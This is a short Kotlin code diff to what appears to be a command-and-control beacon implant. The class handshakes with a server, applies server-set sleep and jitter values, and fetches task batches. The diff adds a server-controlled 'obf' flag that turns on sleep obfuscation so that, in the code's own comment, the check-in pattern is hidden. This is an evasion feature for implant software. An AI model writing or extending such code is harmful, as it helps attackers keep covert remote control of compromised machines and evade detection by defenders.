@@ -212,6 +212,8 @@ class Beacon(
         ack.field("cfg")?.let { cfg ->
             cfg.field("sleep")?.long()?.let { sleep = it.coerceAtLeast(1) }
             cfg.field("jitter")?.long()?.let { jitter = it.toInt() }
+            // The server decides whether the check-in pattern is hidden.
+            cfg.field("obf")?.flag()?.let { sleepObfuscate = it }
         }
         log("handshake complete (suite=$negSuite)")
     }
@@ -266,6 +268,7 @@ class Beacon(
         // Server-side policy wins over the compiled-in cadence.
         batchBody.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
         batchBody.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
+        batchBody.field("obf")?.flag()?.let { sleepObfuscate = it }
         val tasks = batchBody.field("tasks")?.list() ?: emptyList()
         for (task in tasks) {
             val id = task.field("id")?.text() ?: ""
